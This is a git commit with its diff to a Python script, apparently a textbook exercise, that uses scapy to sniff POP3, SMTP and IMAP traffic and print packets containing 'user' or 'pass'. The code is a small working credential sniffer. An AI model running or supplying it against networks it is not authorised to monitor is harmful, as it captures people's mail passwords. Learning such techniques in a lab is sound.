81cd8ab4e477242b3d44fc3ba0ed821e6dc71edb
Wyvernslay3r <ethanboatright@gmail.com>
2022-03-28 19:31:18 -0400

    Minor changes to mail_sniffer.  - Only looks on specified ports (see filter parameter)  - Looks for user or pass as content within sniffed packets 	modified:   chapter4/mail_sniffer.py

--- chapter4/mail_sniffer.py
+++ chapter4/mail_sniffer.py
@@ -1,11 +1,22 @@
+from tracemalloc import stop
 from scapy.all import sniff, TCP, IP
 
+
 def packet_sniff(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f"[*] Packet Destination : {packet[IP].dst}")
+            print(f"[*] {str(packet[TCP].payload)}")
+
+    # print(packet.show())
+
 
 def main():
-    sniff(prn=packet_sniff, count=1)
+    # Begin Packet Sniffing with new filter
+    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143 ',
+          prn=packet_sniff, store=0)
 
-if __name__=='__main__':
+
+if __name__ == '__main__':
     main()
-    
